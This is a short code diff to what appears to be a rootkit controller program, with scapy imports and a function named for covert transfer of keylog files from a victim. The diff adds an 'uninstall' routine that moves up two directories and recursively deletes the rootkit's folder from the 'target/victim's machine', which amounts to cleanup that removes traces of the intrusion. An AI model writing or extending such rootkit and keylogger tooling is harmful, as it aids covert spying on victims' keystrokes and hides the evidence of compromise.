@@ -1,6 +1,7 @@
 import getopt
 import ipaddress
 import queue
+import shutil
 import sys
 import time
 from scapy.layers.inet6 import IPv6
@@ -3956,3 +3957,20 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
         print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
         print(constants.AWAIT_NEXT_OP_MSG)
         print(constants.MENU_CLOSING_BANNER)
+
+
+def uninstall(rootkit_name: str):
+    """
+    Uninstalls the rootkit from target/victim's
+    machine
+
+    @param rootkit_name:
+        A string representing the path of rootkit
+
+    @return: None
+    """
+    # Get directory/path of rootkit storage (by going back 2 directories)
+    os.chdir('..')
+    os.chdir('..')
+    directory_to_remove = rootkit_name
+    shutil.rmtree(directory_to_remove)
